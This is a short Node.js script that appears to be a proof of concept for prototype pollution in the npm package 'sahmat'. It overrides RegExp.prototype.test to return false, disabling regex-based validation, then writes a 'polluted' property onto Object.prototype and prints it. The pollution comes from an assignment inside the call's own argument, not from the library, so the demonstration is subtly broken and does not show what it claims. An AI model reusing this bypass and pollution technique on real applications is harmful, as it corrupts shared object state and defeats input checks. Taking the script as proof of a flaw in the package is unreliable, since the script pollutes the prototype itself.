RegExp.prototype.test = () => false;
const sahmat = require('sahmat');
let obj = { tmp: '' };
console.log({}.polluted);
sahmat(obj, 'tmp', obj.constructor.prototype.polluted = 'yes');
console.log('{ ' + obj.tmp.polluted + ', ' + 'yes' + ' }');